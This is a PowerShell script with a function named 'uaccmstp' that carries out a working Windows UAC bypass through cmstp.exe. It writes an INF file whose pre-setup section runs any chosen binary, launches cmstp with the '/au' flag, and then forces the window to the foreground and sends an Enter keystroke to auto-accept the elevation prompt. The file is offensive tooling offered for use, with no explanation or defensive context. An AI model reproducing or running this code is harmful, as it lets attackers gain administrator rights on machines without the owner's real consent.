function uaccmstp
{

param(
        [String]
        $BinFile
    )

Function script:Set-INFFile {
[CmdletBinding()]
	Param (
	[Parameter(HelpMessage="Specify the INF file location")]
	$InfFileLocation = "$env:temp\CMSTP.inf",
	
	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
	[String]$CommandToExecute = "$BinFile"
	)

$InfContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
$CommandToExecute
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="AdobeTest"
ShortSvcName="AdobeTest"

"@

$InfContent | Out-File $InfFileLocation -Encoding ASCII
}


Function Get-Hwnd
{
  [CmdletBinding()]
    
  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
  )
  Process
    {
        $ErrorActionPreference = 'Stop'
        Try 
        {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        }
        Catch 
        {
            $hwnd = $null
        }
        $hash = @{
        ProcessName = $ProcessName
        Hwnd        = $hwnd
        }
        
    New-Object -TypeName PsObject -Property $hash
    }
}

function Set-WindowActive
{
  [CmdletBinding()]

  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
  )
  
  Process
  {
    $memberDefinition = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

'@

    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
    If ($hwnd) 
    {
      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
      [User32.Api]::SetForegroundWindow($hwnd)
      [User32.Api]::ShowWindow($hwnd, 5)
    }
    Else 
    {
      [string] $hwnd = 'N/A'
    }

    $hash = @{
      Process = $Name
      Hwnd    = $hwnd
    }
        
    New-Object -TypeName PsObject -Property $hash
  }
}

. Set-INFFile
#Needs Windows forms
add-type -AssemblyName System.Windows.Forms
If (Test-Path $InfFileLocation) {
  #Command to run
  $ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
  $ps.Arguments = "/au $InfFileLocation"
  $ps.UseShellExecute = $false

  #Start it
  [system.diagnostics.process]::Start($ps)

  do
  {
    # Do nothing until cmstp is an active window
  }
  until ((Set-WindowActive cmstp).Hwnd -ne 0)


  #Activate window
  Set-WindowActive cmstp

  #Send the Enter key
  [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}

}
